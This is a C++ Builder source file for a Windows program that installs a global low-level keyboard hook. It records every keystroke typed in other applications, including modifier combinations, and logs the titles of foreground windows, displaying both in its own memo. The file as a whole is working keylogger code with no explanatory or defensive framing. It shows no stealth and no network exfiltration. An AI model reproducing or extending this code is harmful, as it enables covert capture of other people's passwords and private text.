//---------------------------------------------------------------------------

#include <vcl.h>
#pragma hdrstop

#include "KHMainFrm.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TfrmMain *frmMain;
//---------------------------------------------------------------------------
HHOOK g_hHookKbdLL;
TMemo*KeyHookWin=NULL;
void*SelfHandle;
void*TopWin,*OldWin;

#define KEY_CAPS 0x14
#define KEY_SCROLL 0x91
#define KEY_NUM 0x90
int _GetKeyState(int key)
{
    //1表示灯亮  0表示灭
    return GetKeyState(key);
}

void processStr(AnsiString str)
{
    if(KeyHookWin==NULL)
        return;
    if(TopWin==SelfHandle)
        return;
    KeyHookWin->Text = KeyHookWin->Text + str;
    KeyHookWin->SelStart = KeyHookWin->Text.Length();
    KeyHookWin->SelLength = 1;
}


LRESULT CALLBACK MyTaskKeyHookLL(int nCode, WPARAM wp, LPARAM lp)
{
	KBDLLHOOKSTRUCT *pkh = (KBDLLHOOKSTRUCT *) lp;
    char c;
	//if (nCode>=HC_ACTION) {
    BOOL bCtrlKeyDown =
        GetAsyncKeyState(VK_CONTROL)>>((sizeof(SHORT) * 8) - 1);
    BOOL bShiftKeyDown =
        GetAsyncKeyState(VK_SHIFT)>>((sizeof(SHORT) * 8) - 1);
    BOOL bAltKeyDown =
        GetAsyncKeyState(LLKHF_ALTDOWN)>>((sizeof(SHORT) * 8) - 1);

        //bool bAltCtrlDel=pkh->flags&LLKHF_ALTDOWN &&
        //    GetAsyncKeyState(VK_CONTROL)<0 &&
        //    //bCtrlKeyDown &&
        //    pkh->vkCode==VK_DELETE;
        //bool b1=pkh->flags&LLKHF_ALTDOWN ;
        //    pkh->vkCode==VK_DELETE;
        //bool b2=
        //   GetAsyncKeyState(VK_CONTROL)<0;
        //bool b3= bCtrlKeyDown && pkh->flags&LLKHF_ALTDOWN;
        AnsiString sKeyStr="";
        if(pkh->vkCode==VK_DELETE && (pkh->flags & LLKHF_ALTDOWN) != 0)
        {
            sKeyStr = "[ALT+del]";   processStr(sKeyStr);
        }
        if(pkh->vkCode==VK_ESCAPE && bCtrlKeyDown)
        {
            sKeyStr = "[CTRL+ESC]";   processStr(sKeyStr);
        }
        if(pkh->vkCode==VK_TAB && pkh->flags & LLKHF_ALTDOWN)
        {
            sKeyStr = "[ALT+TAB]";     processStr(sKeyStr);
        }
        if(pkh->vkCode==VK_ESCAPE && pkh->flags & LLKHF_ALTDOWN)
        {
            sKeyStr = "[ALT+ESC]";     processStr(sKeyStr);
        }
        if(pkh->vkCode==VK_LWIN || pkh->vkCode==VK_RWIN)
        {
            sKeyStr = "[WIN]";           processStr(sKeyStr);
        }
        //sKeyStr = IntToStr(pkh->vkCode);
        //processStr(sKeyStr);
        if((wp==WM_KEYUP || wp==WM_SYSKEYUP))
        {
            if(sKeyStr=="")
            {
                            switch(pkh->vkCode)
            {
                case VK_UP:
                    sKeyStr = "[UP]";
                    break;
                case VK_DOWN:
                    sKeyStr = "[DOWN]";
                    break;
                case VK_LEFT:
                    sKeyStr = "[LEFT]";
                    break;
                case VK_RIGHT:
                    sKeyStr = "[RIGHT]";
                    break;
                case VK_PRIOR:
                    sKeyStr = "[PgUp]";
                    break;
                case VK_NEXT:
                    sKeyStr = "[PgDn]";
                    break;
                case VK_SNAPSHOT:
                    sKeyStr = "[PrtSc]";
                    break;
                case VK_RETURN:
                    sKeyStr = "\r\n";
                    break;
                case VK_BACK:
                    sKeyStr = "[BACK]";
                    break;
                case VK_DELETE:
                    sKeyStr = "[DEL]";
                    break;
                case VK_INSERT:
                    sKeyStr = "[INS]";
                    break;
                case VK_HOME:
                    sKeyStr = "[HOME]";
                    break;
                case VK_END:
                    sKeyStr = "[END]";
                    break;
                case VK_TAB:
                    sKeyStr = "[TAB]";
                    break;
                case VK_ESCAPE:
                    sKeyStr = "[ESC]";
                    break;
                case VK_SHIFT:
                    sKeyStr = "[SHIFT]";
                    break;
                case VK_CAPITAL:
                    sKeyStr = "[CAPS]";
                    break;
                case VK_F1:
                    sKeyStr = "[F1]";
                    break;
                case VK_F2:
                    sKeyStr = "[F2]";
                    break;
                case VK_F3:
                    sKeyStr = "[F3]";
                    break;
                case VK_F4:
                    sKeyStr = "[F4]";
                    break;
                case VK_F5:
                    sKeyStr = "[F5]";
                    break;
                case VK_F6:
                    sKeyStr = "[F6]";
                    break;
                case VK_F7:
                    sKeyStr = "[F7]";
                    break;
                case VK_F8:
                    sKeyStr = "[F8]";
                    break;
                case VK_F9:
                    sKeyStr = "[F9]";
                    break;
                case VK_F10:
                    sKeyStr = "[F10]";
                    break;
                case VK_F11:
                    sKeyStr = "[F11]";
                    break;
                case VK_F12:
                    sKeyStr = "[F12]";
                    break;
                case 192:
                    sKeyStr = "`";
                    break;
                default:
                    c = pkh->vkCode;
                    switch(c)
                    {
                        case 192:
                            sKeyStr = "`";
                            break;
                        case VK_NUMPAD0://96
                            sKeyStr = "NUM_0";
                            break;
                        case VK_NUMPAD1://96
                            sKeyStr = "NUM_1";
                            break;
                        case VK_NUMPAD2://96
                            sKeyStr = "NUM_2";
                            break;
                        case VK_NUMPAD3://96
                            sKeyStr = "NUM_3";
                            break;
                        case VK_NUMPAD4://96
                            sKeyStr = "NUM_4";
                            break;
                        case VK_NUMPAD5://96
                            sKeyStr = "NUM_5";
                            break;
                        case VK_NUMPAD6://96
                            sKeyStr = "NUM_6";
                            break;
                        case VK_NUMPAD7://96
                            sKeyStr = "NUM_7";
                            break;
                        case VK_NUMPAD8://96
                            sKeyStr = "NUM_8";
                            break;
                        case VK_NUMPAD9:
                            sKeyStr = "NUM_9";
                            break;

                        case VK_MULTIPLY:
                            sKeyStr = "*";
                            break;
                        case VK_ADD:
                            sKeyStr = "+";
                            break;
                        case VK_SEPARATOR:
                            sKeyStr = "VK_SEPARATOR";
                            break;
                        case VK_SUBTRACT:
                            sKeyStr = "-";
                            break;
                        case VK_DECIMAL:
                            sKeyStr = ".";
                            break;
                        case VK_DIVIDE:
                            sKeyStr = "/";
                            break;
                        default:
                            sKeyStr = c;
                            break;
                    }

                    if(_GetKeyState(KEY_CAPS)==0)
                    {
                        sKeyStr = sKeyStr.LowerCase();
                    }
                    if(bCtrlKeyDown)
                        sKeyStr = "{[CTRL]+"+sKeyStr+"}";
                    if(bShiftKeyDown)
                        sKeyStr = "{[SHIFT]+"+sKeyStr+"}";
                    if(bAltKeyDown)
                        sKeyStr = "{[ALT]+"+sKeyStr+"}";
                    break;
            }

            }
            //sKeyStr = "Flag:" + IntToStr(pkh->flags)+":"+sKeyStr;
            processStr(sKeyStr);
        }
	//}
	return CallNextHookEx(g_hHookKbdLL, nCode, wp, lp);
}

__fastcall TfrmMain::TfrmMain(TComponent* Owner)
    : TForm(Owner)
{
}
//---------------------------------------------------------------------------
void __fastcall TfrmMain::FormCreate(TObject *Sender)
{
    KeyHookWin = Memo1;
    if (!g_hHookKbdLL) {
        g_hHookKbdLL = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)MyTaskKeyHookLL,HInstance,0);
    }
    TopWin = Handle;
    SelfHandle = Handle;
    OldWin = TopWin;
}
//---------------------------------------------------------------------------
void __fastcall TfrmMain::FormClose(TObject *Sender, TCloseAction &Action)
{
    if(g_hHookKbdLL)
        UnhookWindowsHookEx(g_hHookKbdLL);

}

void __fastcall TfrmMain::Timer1Timer(TObject *Sender)
{

    TopWin = GetForegroundWindow();
    if(TopWin!=OldWin)
    {
        OldWin = TopWin;
        AnsiString sText="[桌面]";
        if(TopWin)
        {
            char Title[300]={0};
            GetWindowTextA(TopWin,Title,300);
            sText = (AnsiString)Title;
        }
        Memo1->Lines->Add("["+sText+"]");
    }
}
//---------------------------------------------------------------------------
